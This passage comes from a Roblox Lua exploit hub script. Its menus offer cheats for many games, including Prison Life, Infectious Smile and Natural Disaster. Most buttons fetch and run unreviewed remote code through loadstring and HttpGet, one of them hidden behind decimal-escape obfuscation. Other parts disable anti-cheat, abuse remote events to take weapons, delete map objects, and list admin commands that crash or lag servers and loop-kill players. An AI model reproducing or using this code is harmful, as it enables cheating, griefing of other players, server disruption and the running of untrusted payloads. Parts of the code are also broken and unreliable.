			loadstring(game:HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()
		elseif Text == ("Custom") then
			loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
		end
	end


	local NotificationBindable = Instance.new("BindableFunction")
	NotificationBindable.OnInvoke = callback
	--
	game.StarterGui:SetCore("SendNotification",  {
		Title = "Witch version would you like?";
		Text = "Please Choose";
		Icon = "";
		Duration = 10;
		Button1 = "Swear Word GUI";
		Button2 = "Custom";
		Callback = NotificationBindable;
	})
end)



eee_13.Name = "eee"
eee_13.Parent = scripts
eee_13.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_13.Position = UDim2.new(0.677618027, 0, 0.369483739, 0)
eee_13.Size = UDim2.new(0, 144, 0, 52)
eee_13.Font = Enum.Font.SourceSans
eee_13.Text = "Bang Script"
eee_13.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_13.TextSize = 25.000
eee_13.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/6Uy22Jfs", true))()
end)



eee_14.Name = "eee"
eee_14.Parent = scripts
eee_14.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_14.Position = UDim2.new(0.0205338821, 0, 0.743785322, 0)
eee_14.Size = UDim2.new(0, 463, 0, 52)
eee_14.Font = Enum.Font.SourceSans
eee_14.Text = "FE Headless!"
eee_14.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_14.TextSize = 50.000
eee_14.MouseButton1Down:connect(function()
	local tool
	local player = game.Players.LocalPlayer.Character.Name
	for i,v in pairs (game.Players:GetPlayers()) do
		tool = v.Backpack:FindFirstChild'OddPotion' or v.Character:FindFirstChild'OddPotion'
		if tool then break end
	end

	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v.Name == "Head" and v:GetChildren() then
			tool.TransEvent:FireServer(v,1)
		end
	end
	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
		if v.Name == "face" then
			tool.TransEvent:FireServer(v,1)
		end
	end
end)

gui.Name = "gui"
gui.Parent = Frame
gui.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
gui.BackgroundTransparency = 3.000
gui.BorderColor3 = Color3.fromRGB(85, 255, 0)
gui.Position = UDim2.new(0, 0, 0.399328858, 0)
gui.Size = UDim2.new(0, 487, 0, 179)

eee_15.Name = "eee"
eee_15.Parent = gui
eee_15.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_15.Position = UDim2.new(0.677618027, 0, 0.0172472, 0)
eee_15.Size = UDim2.new(0, 144, 0, 52)
eee_15.Font = Enum.Font.SourceSans
eee_15.Text = "Alpha X "
eee_15.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_15.TextSize = 25.000
eee_15.MouseButton1Down:connect(function()

end)


eee_16.Name = "eee"
eee_16.Parent = gui
eee_16.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_16.Position = UDim2.new(0.351129353, 0, 0.0172472, 0)
eee_16.Size = UDim2.new(0, 144, 0, 52)
eee_16.Font = Enum.Font.SourceSans
eee_16.Text = "GUI 2"
eee_16.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_16.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/MeAL9tUE", true))()
end)
eee_16.TextSize = 25.000

eee_17.Name = "eee"
eee_17.Parent = gui
eee_17.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_17.Position = UDim2.new(0.0225872695, 0, 0.0172472, 0)
eee_17.Size = UDim2.new(0, 144, 0, 52)
eee_17.Font = Enum.Font.SourceSans
eee_17.Text = "GUI 1"
eee_17.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_17.TextSize = 25.000
eee_17.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/RagdollEngineGUI.lua'),true))()
end)

eee_18.Name = "eee"
eee_18.Parent = gui
eee_18.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_18.Position = UDim2.new(0.0225872695, 0, 0.369483739, 0)
eee_18.Size = UDim2.new(0, 144, 0, 52)
eee_18.Font = Enum.Font.SourceSans
eee_18.Text = "Free Push"
eee_18.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_18.TextSize = 25.000
eee_18.MouseButton1Down:connect(function()
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Lime X";
	Text = "Go Near Someone too push!";
})

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Lime X";
	Text = "This May Lag a little!";
})

	local lp = game:GetService("Players").LocalPlayer

	spawn(function()
		while wait(0.05) do
			pcall(function()
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					local PlayerPos = lp.Character.HumanoidRootPart.Position
					local Range = (PlayerPos - v.Character.HumanoidRootPart.Position).magnitude
					if v ~= lp and v.Backpack:FindFirstChild("Push") and Range > 100 then
						v.Backpack.Push.PushEvent:FireServer()
					end
				end
			end)
		end
	end)

	lp.Character.Humanoid.WalkSpeed = 100
	lp.Character.Humanoid.JumpPower = 100

	lp.Character["Local Ragdoll"]:Destroy()
	lp.Character.Controls:Destroy()
	lp.Character["State Handler"]:Destroy()
	lp.Character.LocalScript:Destroy()
end)


eee_19.Name = "eee"
eee_19.Parent = gui
eee_19.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_19.Position = UDim2.new(0.351129353, 0, 0.369483739, 0)
eee_19.Size = UDim2.new(0, 144, 0, 52)
eee_19.Font = Enum.Font.SourceSans
eee_19.Text = "Bruh Hub"
eee_19.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_19.TextSize = 25.000
eee_19.MouseButton1Down:connect(function()
	------Supports Ragdoll Engine , Shinobi Life , And Phantom Forces
	loadstring(game:HttpGet("https://bruh.keshhub.com/main.lua"))()

end)



eee_20.Name = "eee"
eee_20.Parent = gui
eee_20.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_20.Position = UDim2.new(0.677618027, 0, 0.369483739, 0)
eee_20.Size = UDim2.new(0, 144, 0, 52)
eee_20.Font = Enum.Font.SourceSans
eee_20.Text = "Vynixu"
eee_20.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_20.TextSize = 25.000
eee_20.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Scripts/master/Vynixius%20Ragdoll%20Engine%20Loader"))()

end)


eee_21.Name = "eee"
eee_21.Parent = gui
eee_21.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_21.Position = UDim2.new(0.0205338821, 0, 0.743785322, 0)
eee_21.Size = UDim2.new(0, 463, 0, 52)
eee_21.Font = Enum.Font.SourceSans
eee_21.Text = "Script for trash exploits "
eee_21.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_21.TextSize = 30.000
eee_21.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/s2VeV6AY"))()
end)

-- Scripts:

local function UEYJUB_fake_script() -- g.LocalScript 
	local script = Instance.new('LocalScript', g)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = true
		script.Parent.Parent.scripts.Visible = false
		script.Parent.Parent.misc.Visible = false
	end)
end
coroutine.wrap(UEYJUB_fake_script)()
local function HUYD_fake_script() -- sc.LocalScript 
	local script = Instance.new('LocalScript', sc)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = true
		script.Parent.Parent.misc.Visible = false
	end)
end
coroutine.wrap(HUYD_fake_script)()
local function ODQL_fake_script() -- sc.LocalScript 
	local script = Instance.new('LocalScript', sc)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = true
		script.Parent.Parent.misc.Visible = false
	end)
end
coroutine.wrap(ODQL_fake_script)()
local function UALHIR_fake_script() -- M.LocalScript 
	local script = Instance.new('LocalScript', M)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = false
		script.Parent.Parent.misc.Visible = true
	end)
end
coroutine.wrap(UALHIR_fake_script)()
local function PCTD_fake_script() -- M.LocalScript 
	local script = Instance.new('LocalScript', M)

	script.Parent.MouseButton1Down:connect(function()
		script.Parent.Parent.gui.Visible = false
		script.Parent.Parent.scripts.Visible = false
		script.Parent.Parent.misc.Visible = true
	end)
end
coroutine.wrap(PCTD_fake_script)()
local function HFGVJ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	while true do
		script.Parent.TextColor3 = Color3.new (255, 176, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (0, 255, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (255, 0, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (170, 85, 0)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (106, 57, 9)
		wait(.1)
		script.Parent.TextColor3 = Color3.new (0, 16, 176)
		wait(.1)
	end
end
coroutine.wrap(HFGVJ_fake_script)()




--------------------------------------------togglekey


---------------this is toggle gui script 
local function MLNJ_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local frame = script.Parent -- path to the frame
	local mouse = game:GetService('Players').LocalPlayer:GetMouse(); -- we need the mouse object, which also has the keyboard

	mouse.KeyDown:connect(function(key) -- whenever a key is pushed down
		key = key:lower() -- i do this in all my key events, though i don't remember why
		if key == 'p' then -- if key pressed is h
			frame.Visible = not frame.Visible -- flip between visible/invisible
		end
	end)
end
coroutine.wrap(MLNJ_fake_script)()
end)


local Section = Tab:NewSection("Survival The Killer")

Section:NewButton("SurvivalTheKiller GUI 1", " Killer GUI", function()
   local games = { ["SurviveTheKiller"] = 4580204640 } for i,v in pairs(games) do if game.PlaceId == v then print("Supported!"); loadstring(game:HttpGet("https://raw.githubusercontent.com/MiloHaxx/ChairWare/main/Games/" .. i .. ".lua"))() end end loadstring(game:HttpGet("https://raw.githubusercontent.com/MiloHaxx/ChairWare/main/dcJoin.lua"))()
end)




local Section = Tab:NewSection("Pop It Trading")

Section:NewButton("Pop It Trading 1", "Pop It Kids", function()
       loadstring(game:HttpGet(("https://thekillerhood.xyz/cracked/CRACKEDBYKILLERHOOD"),true))()
end)

Section:NewButton("Pop It Trading 2", "Pop It Kids", function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Secrethumanbepro/Secrethumanbepro/main/Pov",true))()
end)

Section:NewButton("Pop It Trading 3", "Pop It Kids", function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Secrethumanbepro/Secrethumanbepro/main/Pov%20v2"))()
end)



local Section = Tab:NewSection("Natural Disaster")

Section:NewButton("Natural Disaster 1", "New GUI OP", function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
end)

Section:NewButton("Natural Disaster 2", "Has More Script", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/main'))()
--Made By 1kWoof#0143
end)

Section:NewButton("Natural Disaster 3", "New and op", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\105\100\50\88\104\119\81\68\39\41\41\40\41\10")()
end)

local Section = Tab:NewSection("Prison Life")

Section:NewButton("Prison Life GUI 1", "New TeddHub", function()
setclipboard("https://discord.gg/pTSg34Jz3n")
print("copied the discord")
if game.PlaceId == 155615604 then
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
             local Window = Library.CreateLib("Teddy hub", "Serpent")
            local Credits = Window:NewTab("Main")
            local CreditsSection = Credits:NewSection("Credits")
            CreditsSection:NewLabel("Scripts Made By: Teddy")
            CreditsSection:NewLabel("and thank to mdr to help me on it!)")


    local Tab = Window:NewTab("Ui")
    local UiSection = Tab:NewSection("Toggle")
    UiSection:NewKeybind("Toggle Ui", "this will hide the ui(does not inculde animation)", Enum.KeyCode.RightControl, function()
        Library:ToggleUI()
    end)

    local Tab = Window:NewTab("LocalPlayer")
    local LocalPlayerSection = Tab:NewSection("Movement")
   LocalPlayerSection:NewSlider("Walkspeed", "if you sprint, you have to adjust again", 500, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
    end)
 LocalPlayerSection:NewSlider("JumpPower", "Turns you into a pogostick.", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
    end)                              
                                                                                                                                   
    
    local Tab = Window:NewTab("Combat")
    local CombatSection = Tab:NewSection("Combat")
    CombatSection:NewButton("Become a american!", "M4A1 Not inculded.", function()
                print("All Weapons Given!")
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
        print(currentOption)
    end)
    CombatSection:NewButton("HitboxExpander", "Hitbox Ui", function()
        loadstring(game:HttpGet(("https://gameovers.net/Scripts/Free/HitboxExpander/main.lua"),true))()
    end)
            local Misc = Window:NewTab("Miscellaneous")
            local MiscSection = Misc:NewSection("Miscellaneous")
            MiscSection:NewButton("Remove all Doors", "Removes Every Door!", function()
                for i,d in pairs(game.Workspace.Doors:GetChildren()) do
                    if d.ClassName == "Model" then
                        d:Destroy()
                    end
                end
            end)
            MiscSection:NewButton("Remove All Fences", "All Fences Will Be Removed!", function()
                for i,l in pairs(game.Workspace["Prison_Fences"]:GetChildren()) do
                    if l.Name == "fence" then
                        l:Destroy()
                    end
                end
            end)
        
            MiscSection:NewButton("Remove All Gates", "All Fences Will Be Removed!", function()
                game.Workspace["Prison_Fences"]["Prison_Gate"]:Destroy()
                game.Workspace["Prison_Fences"]["gate"]:Destroy()
            end)
        
    
    local Tab = Window:NewTab("Admin")
    local AdminSection = Tab:NewSection("madness")
    AdminSection:NewButton("Septex", "Gives You Commands!", function()
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
            end)
            AdminSection:NewButton("PrisonBreaker V1.5", "Prisonbreaker GUI", function()
                loadstring(game:HttpGet(('https://pastebin.com/raw/QcNge4QY'),true))()
            end)
             AdminSection:NewButton("Inf Yield", "gives you more cmds", function()
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
            end)
            local AdminSection = Tab:NewSection("Septex Commands")
        AdminSection:NewLabel(":rank player - gives player commands")
            AdminSection:NewLabel(":kill player - kills player")
            AdminSection:NewLabel(":sa player - spam arrest player")
            AdminSection:NewLabel(":crim player - makes player criminal")
            AdminSection:NewLabel(":bring player - brings player")
            AdminSection:NewLabel(":goto player - makes you go to player")
            AdminSection:NewLabel(":void player - voids player")
            AdminSection:NewLabel(":key player - gives player keycard")
            AdminSection:NewLabel(":cuffs player - gives player handcuffs")
            AdminSection:NewLabel(":trap player - traps player")
            AdminSection:NewLabel(":yard player - brings player to yard")
            AdminSection:NewLabel(":base player - brings player to criminal base")
            AdminSection:NewLabel(":prison player - brings player to prison")
            AdminSection:NewLabel(":lk - loopkills player")
            AdminSection:NewLabel(":aura - gives player kill aura")
            AdminSection:NewLabel(":virus - makes anyone who touch player dies")
            AdminSection:NewLabel(":oof - kills everyone")
            AdminSection:NewLabel(":spike - lag spike")
            AdminSection:NewLabel(":bspike - big lag spike")
            AdminSection:NewLabel(":lag - lags the server")
            AdminSection:NewLabel(":crash - crashes the server")
            AdminSection:NewLabel(":tk player - teleport you to player and kills them")
            AdminSection:NewLabel(":ltk player - loops tpkill")
            AdminSection:NewLabel(":logs - prints all used cmds")
            local Tab = Window:NewTab("Troll")
            local TrollSection = Tab:NewSection("FLY")
            TrollSection:NewButton("Flycar (AirWav)", "superman but car", function()
                loadstring(game:HttpGet(('https://pastebin.com/raw/VLBwAgwT'),true))()
            end)
    
            local TrollSection = Tab:NewSection("Dances")
            TrollSection:NewButton("NullWare V3", "i went through links for you", function()
                loadstring(game:HttpGet(('https://pastebin.com/raw/jUxDxBsp'),true))()
            end)

    local Tab = Window:NewTab("Teleports")
    local TeleportsSection = Tab:NewSection("be even faster than flash")
    TeleportsSection:NewButton("Outside of prison", "Teleports You outside of the prison!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(451.6684265136719, 98.0399169921875, 2216.338134765625)
            end)
            TeleportsSection:NewButton("Prison Yard", "Teleports You to the Prison Yard", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(736.4671630859375, 97.99992370605469, 2517.583740234375)
            end)
            TeleportsSection:NewButton("Kitchen", "Teleports You to the Kitchen!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(906.641845703125, 99.98993682861328, 2237.67333984375)
            end)
            TeleportsSection:NewButton("Prison Cells", "Teleports You to the Prison Cells!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(919.5551147460938, 99.98998260498047, 2441.700927734375)
            end)
            TeleportsSection:NewButton("Surveilance Room", "Teleports You to the Surveilance Room!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(795.251953125, 99.98998260498047, 2327.720703125)
            end)
            TeleportsSection:NewButton("Break Room", "Teleports You to the Break Room!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(800.0896606445312, 99.98998260498047, 2266.71630859375)
            end)
            TeleportsSection:NewButton("Police Armory", "Teleports You to the Police Armory!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(837.2889404296875, 99.98998260498047, 2270.99658203125)
            end)
            TeleportsSection:NewButton("Police Room", "Teleports to to the Police Room", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(836.5386352539062, 99.98998260498047, 2320.604248046875)
            end)
            TeleportsSection:NewButton("Cafeteria", "Teleports you to the Cafeteria!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(918.994873046875, 99.98993682861328, 2325.73095703125)
            end)
            TeleportsSection:NewButton("Criminal Base Inside", "Teleports you to the Criminal Base Inside!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-975.8451538085938, 109.32379150390625, 2053.11376953125)
    end)
    
    coroutine.wrap(UVUZD_fake_script)()
game.Player.LocalPlayer:kick("go to prison bro")

    else

end
end)


Section:NewButton("PrisonLife Admin 1",  "Gives you septex admin", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
end)

Section:NewButton("PrisonLife gui 2",  "Gives you Op stuff lol", function()
loadstring(game:HttpGet("https://pastebin.com/raw/wMagw9Cn", true))()
end)

Section:NewButton("PrisonLife Admin 2", "New and op", function()
loadstring(game:HttpGet('https://pastebinp.com/raw/dt7JbaH5'))()
end)

Section:NewButton("PrisonLife gui 3", "Gui lol", function()
loadstring(game:HttpGet("https://pastebin.com/raw/dJ6tcE7h", true))()
end)



local Section = Tab:NewSection ("Infectious Smile")

Section:NewButton("Infectious Smile 1", "Smile Bitch", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/WG1BMS72",true))()
end)

Section:NewButton("Infectious Smile 2", "Smile Bitch", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local AntiInfect = Instance.new("TextButton")
local RemoveKillBrick = Instance.new("TextButton")
local BringWeapons = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local Infect = Instance.new("TextButton")
local Dizzy = Instance.new("TextButton")
local Faster = Instance.new("TextButton")
local AHack = Instance.new("TextButton")
local OPBat = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 100
Frame.Position = UDim2.new(0.491947293, 0, 0.226069272, 0)
Frame.Size = UDim2.new(0, 261, 0, 173)
Frame.Style = Enum.FrameStyle.RobloxRound
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.0842911899, 0, -0.0462427735, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Infectious Smile GUI"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 20.000
TextLabel.TextWrapped = true

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
ScrollingFrame.Position = UDim2.new(0.0867867321, 0, 0.270812541, 0)
ScrollingFrame.Size = UDim2.new(0, 203, 0, 100)
ScrollingFrame.CanvasPosition = Vector2.new(0, 150)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 5, 0)
ScrollingFrame.ScrollBarThickness = 10
ScrollingFrame.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

AntiInfect.Name = "AntiInfect"
AntiInfect.Parent = ScrollingFrame
AntiInfect.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AntiInfect.Position = UDim2.new(0.0935960561, 0, 0.0123584419, 0)
AntiInfect.Size = UDim2.new(0, 165, 0, 50)
AntiInfect.Style = Enum.ButtonStyle.RobloxRoundButton
AntiInfect.Font = Enum.Font.Ubuntu
AntiInfect.Text = "Anti-Infect"
AntiInfect.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiInfect.TextSize = 20.000
(AntiInfect).MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.Stats.Infected:Destroy() game.Players.LocalPlayer.Character.Stats.Infected:Destroy()
end)

OPBat.Name = "OPBat"
OPBat.Parent = ScrollingFrame
OPBat.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OPBat.Position = UDim2.new(0.0935960561, 0, 0.43, 0)
OPBat.Size = UDim2.new(0, 165, 0, 50)
OPBat.Style = Enum.ButtonStyle.RobloxRoundButton
OPBat.Font = Enum.Font.Ubuntu
OPBat.Text = "OP Bat"
OPBat.TextColor3 = Color3.fromRGB(0, 0, 0)
OPBat.TextSize = 20.000
(OPBat).MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.Bat.MaxUses:Destroy() game.Players.LocalPlayer.Character.Bat.Cooldown.Value = 0
end)


AHack.Name = "AHack"
AHack.Parent = ScrollingFrame
AHack.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AHack.Position = UDim2.new(0.0935960561, 0, 0.37, 0)
AHack.Size = UDim2.new(0, 165, 0, 50)
AHack.Style = Enum.ButtonStyle.RobloxRoundButton
AHack.Font = Enum.Font.Ubuntu
AHack.Text = "Disable AntiHack"
AHack.TextColor3 = Color3.fromRGB(0, 0, 0)
AHack.TextSize = 20.000
(AHack).MouseButton1Down:connect(function()
workspace.Map.AntiHack:Destroy() game.Players.LocalPlayer.Character.AntiFly:Destroy()
end)


RemoveKillBrick.Name = "RemoveKillBrick"
RemoveKillBrick.Parent = ScrollingFrame
RemoveKillBrick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RemoveKillBrick.Position = UDim2.new(0.0935960561, 0, 0.0695839003, 0)
RemoveKillBrick.Size = UDim2.new(0, 165, 0, 50)
RemoveKillBrick.Style = Enum.ButtonStyle.RobloxRoundButton
RemoveKillBrick.Font = Enum.Font.Ubuntu
RemoveKillBrick.Text = "Remove KillBricks"
RemoveKillBrick.TextColor3 = Color3.fromRGB(0, 0, 0)
RemoveKillBrick.TextSize = 20.000
(RemoveKillBrick).MouseButton1Down:connect(function()
workspace.Map.KillBricks:Destroy()
end)

Infect.Name = "Infect"
Infect.Parent = ScrollingFrame
Infect.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Infect.Position = UDim2.new(0.0935960561, 0, 0.19, 0)
Infect.Size = UDim2.new(0, 165, 0, 50)
Infect.Style = Enum.ButtonStyle.RobloxRoundButton
Infect.Font = Enum.Font.Ubuntu
Infect.Text = "Infect"
Infect.TextColor3 = Color3.fromRGB(0, 0, 0)
Infect.TextSize = 20.000
(Infect).MouseButton1Down:connect(function()
workspace.Map.Infectors.Infector.Part.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
workspace.Map.Infectors.Infector.Part.CanCollide = false
game.Players.LocalPlayer.Character.Infected.InfectedSpeed.Value = 0
end)

Dizzy.Name = "Dizzy"
Dizzy.Parent = ScrollingFrame
Dizzy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Dizzy.Position = UDim2.new(0.0935960561, 0, 0.25, 0)
Dizzy.Size = UDim2.new(0, 165, 0, 50)
Dizzy.Style = Enum.ButtonStyle.RobloxRoundButton
Dizzy.Font = Enum.Font.Ubuntu
Dizzy.Text = "Speed"
Dizzy.TextColor3 = Color3.fromRGB(0, 0, 0)
Dizzy.TextSize = 20.000
(Dizzy).MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
end)

Faster.Name = "Faster"
Faster.Parent = ScrollingFrame
Faster.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Faster.Position = UDim2.new(0.0935960561, 0, 0.31, 0)
Faster.Size = UDim2.new(0, 165, 0, 50)
Faster.Style = Enum.ButtonStyle.RobloxRoundButton
Faster.Font = Enum.Font.Ubuntu
Faster.Text = "Reset"
Faster.TextColor3 = Color3.fromRGB(0, 0, 0)
Faster.TextSize = 20.000
(Faster).MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.Head:Destroy()
end)

BringWeapons.Name = "BringWeapons"
BringWeapons.Parent = ScrollingFrame
BringWeapons.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BringWeapons.Position = UDim2.new(0.0935960561, 0, 0.128543437, 0)
BringWeapons.Size = UDim2.new(0, 165, 0, 50)
BringWeapons.Style = Enum.ButtonStyle.RobloxRoundButton
BringWeapons.Font = Enum.Font.Ubuntu
BringWeapons.Text = "Bring Weapons"
BringWeapons.TextColor3 = Color3.fromRGB(0, 0, 0)
BringWeapons.TextSize = 20.000
(BringWeapons).MouseButton1Down:connect(function()
workspace.Map.Terrain.Vendor.BottleCollection.Bottle.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
workspace.Map.Terrain.Vendor.BatCollection.Bat.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
end)

Close.Name = "Close"
Close.Parent = Frame
Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Close.Position = UDim2.new(0.94081533, 0, -0.0352032557, 0)
Close.Size = UDim2.new(0, 21, 0, 22)
Close.Style = Enum.ButtonStyle.RobloxRoundButton
Close.Font = Enum.Font.Ubuntu
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 20.000
(Close).MouseButton1Down:connect(function()
game.CoreGui.ScreenGui:Destroy()
end)

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0804597512, 0, -0.14450869, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Witz#7727"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 15.000
TextLabel_2.TextWrapped = true
end)



local Section = Tab:NewSection("Kicking Simulator")

Section:NewButton("Kicking Simulator 1", "Kick the Ball", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/Scripts/main/GoalKickSimulator"))()
end)



local Section = Tab:NewSection("Bot Clash")

Section:NewButton("Bot Clash 1", "Robot Crashing Each other", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Krackenz/RobloxScripts/main/Protected%20(6).lua",true))()
end)



local Section = Tab:NewSection("Military Tycoon")

Section:NewButton("Military Tycoon 1", "BANG BANG", function()
   loadstring(game:HttpGet"https://thedragonslayer2.github.io")()
end)



local Section = Tab:NewSection("Sonic Speed Simulator")

Section:NewButton("Sonic Speed Simulator 1", "Gotta Go Fast", function()
   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SkaysGG-2095"))()
end)

Section:NewButton("Sonic Speed Simulator 2", "Go gotta fast bitch", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Luciquad/credit/main/sonicspeedsimulator.lua"))()
end)


local Section = Tab:NewSection("Rebirth Champion X")

Section:NewButton("Rebirth Champion X 1", "Idk this game", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/SunkenMuch/Soggyware/main/Main',true))()
end)



